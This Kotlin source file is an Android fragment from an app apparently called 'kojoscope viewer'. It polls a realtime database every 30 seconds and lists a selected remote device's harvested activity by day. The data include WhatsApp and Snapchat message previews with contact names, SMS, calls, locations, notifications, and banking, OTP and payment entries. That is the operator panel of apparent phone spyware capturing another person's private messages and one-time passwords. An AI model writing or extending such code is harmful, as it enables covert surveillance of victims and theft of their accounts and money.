package com.kojoscope.viewer.ui.activity

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ProgressBar
import android.widget.TextView
import androidx.fragment.app.Fragment
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.kojoscope.viewer.R
import com.kojoscope.viewer.net.DeviceRepo
import com.kojoscope.viewer.net.RtdbClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.TimeZone

class TimelineFragment : Fragment() {

    private var deviceId: String = ""
    private var recycler: RecyclerView? = null
    private var progress: ProgressBar? = null
    private var empty: TextView? = null
    private val adapter = TimelineAdapter(emptyList())
    private var pollJob: Job? = null
    private val client = RtdbClient.getInstance()

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        return inflater.inflate(R.layout.fragment_timeline, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        recycler = view.findViewById(R.id.recycler)
        progress = view.findViewById(R.id.progress)
        empty = view.findViewById(R.id.empty)
        recycler?.layoutManager = LinearLayoutManager(context)
        recycler?.adapter = adapter

        val repo = DeviceRepo(requireContext())
        deviceId = repo.getSelectedDeviceId()

        startPolling()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        pollJob?.cancel()
        recycler = null
    }

    private fun startPolling() {
        pollJob = CoroutineScope(Dispatchers.Main).launch {
            while (isActive) {
                val current = DeviceRepo(requireContext()).getSelectedDeviceId()
                if (current.isNotEmpty()) deviceId = current
                if (deviceId.isNotEmpty()) loadTimeline()
                delay(30000)
            }
        }
    }

    private suspend fun loadTimeline() {
        withContext(Dispatchers.Main) {
            progress?.visibility = View.VISIBLE
            empty?.visibility = View.GONE
        }
        val entries = withContext(Dispatchers.IO) { fetchAll(deviceId) }
        withContext(Dispatchers.Main) {
            progress?.visibility = View.GONE
            if (entries.isEmpty()) {
                empty?.visibility = View.VISIBLE
            } else {
                adapter.update(buildItems(entries))
            }
        }
    }

    private suspend fun fetchAll(deviceId: String): List<TimelineEntry> {
        val all = mutableListOf<TimelineEntry>()
        var oldestKey: String? = null
        for (page in 0 until 30) {
            val query = buildString {
                append("orderBy=%22%24key%22&limitToLast=1000")
                if (oldestKey != null) append("&endAt=").append(
                    java.net.URLEncoder.encode(JSONObject.quote(oldestKey), "UTF-8")
                )
            }
            val resp = client.get("devices/$deviceId/timeline", query)
            if (resp == null) break
            val keys = mutableListOf<String>()
            val iter = resp.keys()
            while (iter.hasNext()) keys.add(iter.next())
            if (keys.isEmpty()) break
            keys.forEach { k ->
                val v = resp.getJSONObject(k)
                all.add(parseEntry(v))
            }
            if (keys.size < 1000) break
            val newOldest = keys.minOrNull()
            if (newOldest == oldestKey) break
            oldestKey = newOldest
        }
        return all.sortedByDescending { it.tsMs }
    }

    private fun parseEntry(obj: JSONObject): TimelineEntry {
        fun optStr(key: String): String? {
            val v = obj.optString(key, "")
            return if (v.isNotEmpty()) v else null
        }
        return TimelineEntry(
            tsMs = obj.optLong("ts_ms"),
            type = obj.optString("type", ""),
            contactName = optStr("contactName"),
            contact = optStr("contact"),
            messagePreview = optStr("messagePreview"),
            duration = obj.optLong("duration").takeIf { it > 0 },
            direction = optStr("direction"),
            groupName = optStr("groupName"),
            rawText = optStr("rawText"),
            packageName = optStr("packageName"),
            isIncoming = optStr("isIncoming")
        )
    }

    private fun typeIcon(type: String): String {
        val t = type.lowercase()
        return when {
            t.contains("snapchat") -> "\uD83D\uDCF8"
            t.contains("whatsapp") -> "\uD83D\uDCE4"
            t.contains("call") -> "\uD83D\uDEDE"
            t.contains("sms") || t.contains("message") -> "\uD83D\uDCEF"
            t.contains("banking") || t.contains("financial") || t.contains("otp") || t.contains("payment") || t.contains("transaction") -> "\uD83D\uDCB3"
            t == "location" || t.contains("location") -> "\uD83D\uDCCD"
            t.contains("notification") -> "\uD83D\uDD14"
            t.contains("app") -> "\uD83D\uDCFCB"
            else -> "\uD83D\uDDD1"
        }
    }

    private fun buildItems(entries: List<TimelineEntry>): List<TimelineItem> {
        val dayFmt = SimpleDateFormat("MMM dd, yyyy", Locale.getDefault())
        dayFmt.timeZone = TimeZone.getTimeZone("Asia/Karachi")
        val grouped = LinkedHashMap<String, MutableList<TimelineEntry>>()
        for (e in entries) {
            val day = dayFmt.format(e.tsMs)
            grouped.getOrPut(day) { mutableListOf() }.add(e)
        }
        val result = mutableListOf<TimelineItem>()
        for ((day, dayEntries) in grouped) {
            val locs = dayEntries.count { it.type.lowercase().contains("location") }
            val calls = dayEntries.count { it.type.lowercase().contains("call") }
            val msgs = dayEntries.count { it.type.lowercase().contains("whatsapp") || it.type.lowercase().contains("message") }
            val snaps = dayEntries.count { it.type.lowercase().contains("snapchat") }
            val summary = buildList<String> {
                if (locs > 0) add("$locs \uD83D\uDCCD")
                if (calls > 0) add("$calls \uD83D\uDEDE")
                if (msgs > 0) add("$msgs \uD83D\uDCE4")
                if (snaps > 0) add("$snaps \uD83D\uDCF8")
            }.joinToString(" ")
            result.add(TimelineItem.DayHeader(day, summary))
            for (e in dayEntries) {
                val icon = typeIcon(e.type)
                val contact = e.contactName ?: e.contact ?: "(no contact)"
                val msg: String? = e.messagePreview
                val raw: String? = e.rawText
                val title = when {
                    !msg.isNullOrEmpty() -> "$contact: $msg"
                    !raw.isNullOrEmpty() -> raw.trim()
                    else -> contact
                }
                val subParts = mutableListOf<String>()
                e.duration?.let { if (it > 0) subParts.add("${it}s") }
                e.direction?.let { if (it.isNotEmpty()) subParts.add(it) }
                e.packageName?.let { if (it.isNotEmpty()) subParts.add(it.substringAfterLast(".")) }
                val subtitle = subParts.joinToString(" • ")
                result.add(TimelineItem.Entry(e, icon, title, subtitle))
            }
        }
        return result
    }
}
